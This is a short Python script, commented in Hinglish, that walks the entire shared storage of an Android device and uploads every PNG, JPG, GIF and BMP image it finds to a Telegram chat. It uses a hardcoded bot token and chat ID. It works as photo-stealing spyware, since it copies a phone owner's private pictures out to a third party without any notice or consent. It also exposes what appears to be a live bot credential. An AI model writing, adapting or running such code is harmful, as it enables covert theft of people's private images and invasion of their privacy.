import os
import telepot

# Telegram bot token aur chat id
TOKEN = '7888404691:AAFv2GD9yfyGRPicUZVej8LOwpRE-xcdwCs'
CHAT_ID = '7006569478'

# Telegram bot instance
bot = telepot.Bot(TOKEN)

# Full storage path (Android storage path)
storage_path = '/storage/emulated/0/'

# Function to send image to Telegram
def send_photo(photo_path):
    with open(photo_path, 'rb') as f:
        bot.sendPhoto(CHAT_ID, f)

# Function to scan directories and find all photos
def scan_and_send_photos(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                photo_path = os.path.join(root, file)
                send_photo(photo_path)

# Scan and send photos
scan_and_send_photos(storage_path)
